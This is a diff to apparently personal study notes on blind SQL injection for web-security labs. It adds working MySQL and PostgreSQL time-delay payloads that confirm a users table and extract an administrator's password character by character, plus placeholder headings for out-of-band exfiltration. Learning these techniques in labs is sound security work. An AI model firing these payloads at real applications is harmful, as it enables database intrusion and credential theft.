@@ -312,7 +312,7 @@ Using time delays allows us to check the truth of an injected query by monitorin
 
 # MySQL
 '; IF (1=2) SELECT SLEEP(10)#
-'; IF (1=1) SELECT SLEEP(10#
+'; IF (1=1) SELECT SLEEP(10)#
 '; IF (1=2) SELECT SLEEP(10)-- <- Space!
 '; IF (1=1) SELECT SLEEP(10)-- <- Space!
 
@@ -364,15 +364,33 @@ App uses a Tracking cookie which is injectable, exploit this to introduce a 10 s
 
 ```
 
-
-
 **Lab: Blind SQL injection with time delays and information retrieval**
 
 App uses a Tracking cookie which is injectable, exploit this to retrieve the administrator's password
 
 ```
+# Test injection with a time delay (PostgreSQL)
 ';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+# Confirm 'users' table exists
+';SELECT CASE WHEN (1=(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_name='users')) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+# Confirm 'administrator' user is in the 'users' table
+';SELECT CASE WHEN (1=(SELECT COUNT(username) FROM users WHERE username='administrator')) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+# Check password characters using SUBSTRING
+';SELECT CASE WHEN (1=(SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1) > 'm')) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 ```
+
+### Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+For SQL executed asynchronously we can use the injected query to cause a DNS lookup against a domain we control
+
+TODO: Come back with Burp Suite Pro
+
+**Lab: Blind SQL injection with out-of-band interaction**
+
+**Lab: Blind SQL injection with out-of-band data exfiltration**
 
 ## Second-order SQL injection AKA Stored SQL injection
 
